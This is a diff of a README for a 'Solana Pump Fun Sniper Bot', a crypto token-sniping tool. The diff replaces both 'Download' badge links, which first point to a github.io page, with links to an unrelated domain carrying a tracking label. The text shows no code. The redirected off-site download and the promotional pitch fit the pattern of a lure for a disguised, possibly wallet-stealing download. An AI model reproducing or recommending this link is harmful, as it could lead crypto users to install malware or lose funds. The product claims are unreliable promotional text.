@@ -2,7 +2,7 @@
 
 The **Solana Pump Fun Sniper Bot** is an advanced, high-speed trading tool designed to automatically snipe new token listings on the **Pump.fun** platform. Whether you're a seasoned trader or a beginner, this bot allows you to quickly enter promising pump tokens as soon as they launch, giving you a competitive edge in the fast-paced world of decentralized finance (DeFi).
 
-[![Download Solana SniperBot](https://img.shields.io/badge/Download-Solana%20SniperBot-blueviolet)](https://solana-pump-fun-sniper-bot.github.io/.github/)
+[![Download Solana SniperBot](https://img.shields.io/badge/Download-Solana%20SniperBot-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ### 🔥 Automated Token Sniping
 - **Instant Buy on Launch**: The bot identifies and buys new Pump.fun tokens as soon as they are listed.
@@ -42,4 +42,4 @@ The **Solana Pump Fun Sniper Bot** is an advanced, high-speed trading tool desig
 - 🧠 **Risk Management**: With built-in stop-loss, take-profit, and trailing stop features, the bot helps protect your investments while maximizing returns.
 - 📈 **Optimized for Solana**: Designed specifically for the Solana blockchain and Pump.fun platform, offering low fees and high-speed transactions.
 
-[![Download Solana SniperBot](https://img.shields.io/badge/Download-Solana%20SniperBot-blueviolet)](https://solana-pump-fun-sniper-bot.github.io/.github/)
+[![Download Solana SniperBot](https://img.shields.io/badge/Download-Solana%20SniperBot-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
